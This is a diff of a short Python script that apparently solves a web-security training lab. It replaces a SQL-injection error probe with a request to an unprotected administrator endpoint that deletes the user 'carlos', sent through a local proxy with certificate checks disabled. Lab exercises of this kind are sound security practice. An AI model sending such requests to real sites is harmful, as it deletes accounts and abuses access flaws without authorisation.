@@ -9,14 +9,14 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}
 
 def broken_authentification_exploit(session, url) :
-    exploit_url = url+"/product?productId=1'"
+    exploit_url = url + "/administrator-panel/delete?username=carlos"
     r = session.get(exploit_url, verify=False, proxies=proxies)
     
-    if "Internal Server Error" in r.text :
-        print("The error message occur great!")
+    if "User deleted successfully!" in r.text :
+        print("Tou have successfully solved the lab!")
         print(r.text)
     else :
-        print("Failed to exploit the error message!")
+        print("Failed to exploit the lab!")
 
 if __name__ == "__main__" :
     try :
